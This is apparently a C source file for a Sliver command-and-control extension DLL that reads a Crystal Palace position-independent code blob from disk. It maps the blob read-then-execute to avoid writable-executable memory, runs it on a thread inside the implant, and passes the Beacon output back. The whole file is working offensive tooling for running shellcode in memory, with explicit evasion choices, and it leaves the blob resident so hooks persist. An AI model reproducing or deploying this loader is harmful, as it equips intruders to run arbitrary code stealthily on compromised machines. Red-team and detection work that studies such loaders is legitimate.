/*
 * crystal-loader.c — Sliver Extension DLL
 *
 * Loads and executes a Crystal Palace PICO blob inside the Sliver implant.
 *
 * argsBuffer format:  "payload=<path_on_target>[|<runtime_args>]"
 *   forward slashes only — Sliver's arg parser eats backslashes.
 *
 * Copyright (c) 2026 Simone Licitra — MIT License
 */

#include <windows.h>
#include <stdint.h>
#include <string.h>
#include <stdio.h>

#include "beacon_compatibility.h"

#ifndef EXPORT
#define EXPORT __declspec(dllexport)
#endif

typedef int  (*ExtCallback)(char *, int);
typedef void (*pico_entry_t)(void *);

static void emit(ExtCallback cb, const char *msg)
{
    if (cb) cb((char *)msg, (int)strlen(msg));
}

typedef struct {
    pico_entry_t entry;
    void        *args;
} thread_params_t;

static DWORD WINAPI exec_thread(LPVOID param)
{
    thread_params_t *p = (thread_params_t *)param;
    p->entry(p->args);
    return 0;
}

EXPORT int __cdecl Initialize(char *argsBuffer, uint32_t bufferSize, ExtCallback callback)
{
    if (!argsBuffer || !bufferSize) {
        emit(callback, "error: no args\n");
        return 1;
    }

    int scan   = (int)bufferSize < 64 ? (int)bufferSize : 64;
    int eq_pos = -1;
    for (int i = 0; i < scan; i++) {
        if ((unsigned char)argsBuffer[i] == '=') { eq_pos = i; break; }
    }
    if (eq_pos < 1 || eq_pos > 32) {
        emit(callback, "error: invalid args\n");
        return 2;
    }

    int val_start = eq_pos + 1;
    int val_len   = (int)bufferSize - val_start;
    if (val_len <= 0 || val_len >= MAX_PATH) {
        emit(callback, "error: invalid path\n");
        return 2;
    }

    int pipe_off = -1;
    for (int i = 0; i < val_len; i++) {
        if ((unsigned char)argsBuffer[val_start + i] == '|') { pipe_off = i; break; }
    }

    int  path_len = (pipe_off >= 0) ? pipe_off : val_len;
    char path[MAX_PATH];
    memcpy(path, argsBuffer + val_start, (size_t)path_len);
    path[path_len] = '\0';

    char *runtime_args = NULL;
    if (pipe_off >= 0) {
        int args_len = val_len - pipe_off - 1;
        if (args_len > 0) {
            runtime_args = (char *)VirtualAlloc(NULL, (SIZE_T)(args_len + 1),
                                                MEM_COMMIT | MEM_RESERVE,
                                                PAGE_READWRITE);
            if (runtime_args) {
                memcpy(runtime_args, argsBuffer + val_start + pipe_off + 1, (size_t)args_len);
                runtime_args[args_len] = '\0';
            }
        }
    }

    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        emit(callback, "error: file not found\n");
        return 3;
    }

    LARGE_INTEGER fs = {0};
    if (!GetFileSizeEx(hFile, &fs) || fs.QuadPart <= 0 ||
        fs.QuadPart > 250 * 1024 * 1024) {
        emit(callback, "error: bad file\n");
        CloseHandle(hFile);
        return 3;
    }
    int blob_size = (int)fs.QuadPart;

    /* Read into RW region, flip to RX — no RWX mapping ever held */
    BYTE *blob = (BYTE *)VirtualAlloc(NULL, (SIZE_T)blob_size,
                                      MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!blob) {
        emit(callback, "error: alloc failed\n");
        CloseHandle(hFile);
        return 3;
    }

    DWORD nr = 0;
    if (!ReadFile(hFile, blob, (DWORD)blob_size, &nr, NULL) || (int)nr != blob_size) {
        emit(callback, "error: read failed\n");
        VirtualFree(blob, 0, MEM_RELEASE);
        CloseHandle(hFile);
        return 3;
    }
    CloseHandle(hFile);

    DWORD old;
    if (!VirtualProtect(blob, (SIZE_T)blob_size, PAGE_EXECUTE_READ, &old)) {
        emit(callback, "error: alloc failed\n");
        VirtualFree(blob, 0, MEM_RELEASE);
        return 3;
    }

    thread_params_t tp = {
        .entry = (pico_entry_t)blob,
        .args  = runtime_args,
    };

    HANDLE hThread = CreateThread(NULL, 0, exec_thread, &tp, 0, NULL);
    if (!hThread) {
        emit(callback, "error: exec failed\n");
        VirtualFree(blob, 0, MEM_RELEASE);
        return 4;
    }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    {
        int   out_size = 0;
        char *out_data = BeaconGetOutputData(&out_size);
        if (out_data && out_size > 0) {
            callback(out_data, out_size);
            free(out_data);
        }
    }

    /* blob intentionally not freed — Crystal Palace hooks stay resident */
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID v)
{
    (void)h; (void)r; (void)v;
    return TRUE;
}
